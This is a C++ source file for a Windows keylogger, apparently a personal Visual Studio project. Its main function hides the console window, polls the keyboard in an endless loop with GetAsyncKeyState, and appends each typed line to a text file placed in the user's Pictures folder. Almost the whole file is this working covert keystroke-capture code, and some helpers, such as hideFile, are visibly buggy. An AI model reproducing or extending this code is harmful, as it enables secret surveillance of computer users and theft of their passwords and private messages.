// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <cstdlib>
#include <tchar.h>
#include <fstream>
#include <string>
#include <cstring>
#include <Shlwapi.h>
#include <WinBase.h>

#define INFO_BUFFER_SIZE 32767
using namespace std;





string currentSentence = "";

/*
Checks to see if a value is a number or not 
*/
bool isNum(DWORD value) {
	if (value >= 0x30 && value <= 0x39)
		return true;
	return false;
}

bool isSpecial(DWORD value) {
	if (value >= 0xBA && value <= 0xDF)
		return true;
	return false;
}


string getCompName() {

	string name = "";
	DWORD hold = INFO_BUFFER_SIZE;
	char* temp = new char[MAX_COMPUTERNAME_LENGTH+1];
	GetUserName(temp, &hold);
	name = temp;
	delete [] temp;
	return name;


}
string getCurrDir() {
	string dir = "";
	char* temp = new char[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, temp);
	dir = temp;
	delete [] temp;
	return dir;
}

char* stringToChar(string text) {
	char* convert = new char[text.length()+1];
	memcpy(convert, text.c_str(), text.length() + 1);
	return convert;
	delete[] convert;
}

void moveFile() {
	char* dest = stringToChar("C:\\Users\\" + getCompName() + "\\Pictures\\test.txt");
	int success = MoveFileA("C:test.txt", dest);
	if (success == 0) {
		cout << "Error in moveFile code- " << GetLastError()<< endl;
	}
}
void createFile() {
	HANDLE file = CreateFile("test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
	if (file == INVALID_HANDLE_VALUE) {
		cout << "Error in creating file" << endl;
	}
	CloseHandle(file);

	//cout << getCurrDir() << " " << endl;
}
void hideFile() {

	DWORD temp;
	HANDLE myFile;
	
	WriteFile(myFile, "Hello", 1, &temp, NULL);
}

void insertIntoText(string text) {
	char *path = stringToChar("C:\\Users\\" + getCompName() + "\\Pictures\\test.txt");
	ofstream myFile;
	myFile.open(path, ios::app);
	if (myFile.is_open()) {
		myFile << text<<endl;
	}
	else {
		cout << "Failed to enter to file" << endl;
	}
	myFile.close();
}
bool checkFile() {
	string path = "C:\\Users\\" + getCompName() + "\\Pictures\\test.txt";
	char* cstr = new char[path.length()+1];
	path.copy(cstr, path.size() );
	cstr[path.size()] = '\0';
	if (GetFileAttributesA(cstr) == 0xffffffff) {
		return false;
	}
	delete [] cstr;
	return true;
}  

void findLetterTyped() {

	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
	char numbers[10] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
	char special[11] = { ';','=',',','-','.','/','`','[','\\',']','\'' };

	DWORD word = 0x30;
	for (int i = 0; i < 52; i++) {
		if ((GetAsyncKeyState(word) & 1)) { //Loops through every single letter until it finds the one with the least bit number changed 

			if (GetKeyState(VK_SHIFT) & 0x8000) {
				if (isNum(word)) {
					switch (word) {
					case 0x31:
						currentSentence += "!";
						break;
					case 0x32:
						currentSentence += "@";
						break;
					case 0x33:
						currentSentence += "#";
						break;
					case 0x34:
						currentSentence += "$";
						break;
					case 0x35:
						currentSentence += "%";
						break;
					case 0x36:
						currentSentence += "^";
						break;
					case 0x37:
						currentSentence += "&";
						break;
					case 0x38:
						currentSentence += "*";
						break;
					case 0x39:
						currentSentence += "(";
						break;
					case 0x30:
						currentSentence += ")";
						break;
					default:
						currentSentence += "ERROR";
						break;
					}
				}
				else {
					currentSentence += toupper(alphabet[abs(42 - i - 26 + 1)]);
				}



			}
			else if (isNum(word)) { //Deals with Uppercase letters
				currentSentence += numbers[i];

			}
			else {
				currentSentence += alphabet[abs(42 - i - 26 + 1)];
			}

		}

		word++;

	}

	DWORD specialKey = 0xBA;
	for (int i = 0; i < 37; i++) {
		if (GetAsyncKeyState(specialKey) & 1) {
			if (GetKeyState(VK_SHIFT) & 0x8000) {
				switch (specialKey) {
				case 0xBA:
					currentSentence += ":";
					break;
				case 0xBB:
					currentSentence += "+";
					break;
				case 0xBC:
					currentSentence += "<";
					break;
				case 0xBD:
					currentSentence += "_";
					break;
				case 0xBE:
					currentSentence += ">";
					break;
				case 0xBF:
					currentSentence += "?";
					break;
				case 0xC0:
					currentSentence += "~";
					break;
				case 0xDB:
					currentSentence += "{";
					break;
				case 0xDC:
					currentSentence += "|";
					break;
				case 0xDD:
					currentSentence += "}";
					break;
				case 0xDE:
					currentSentence += "\"";
					break;

				default:
					currentSentence += "ERROR";
					break;
				}

			}
			else {
				if (i <= 7) {
					currentSentence += special[i];

				}
				else if (i >= 31) {
					currentSentence += special[abs(37 - i - 11)];
				}


			}
		}
		specialKey++;
	}

	if (GetAsyncKeyState(VK_BACK) & 1) {
		currentSentence = currentSentence.substr(0, currentSentence.length() - 1);
	}
	if ((GetAsyncKeyState(VK_SPACE) & 1)) {
		currentSentence += " ";
	}
	if ((GetAsyncKeyState(VK_RETURN) & 1) || (GetAsyncKeyState(VK_TAB) & 1)) {
		insertIntoText(currentSentence);
		currentSentence = "";
		return;
	}
}


void hideConsole() {
	ShowWindow(GetConsoleWindow(), 0);
}
int main()
{

	if (!checkFile()) {
		cout << "File not found" << endl;
		createFile();
		moveFile();
	}

	hideConsole();
	while (1) {
		Sleep(1);
		findLetterTyped();
	}
}



// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
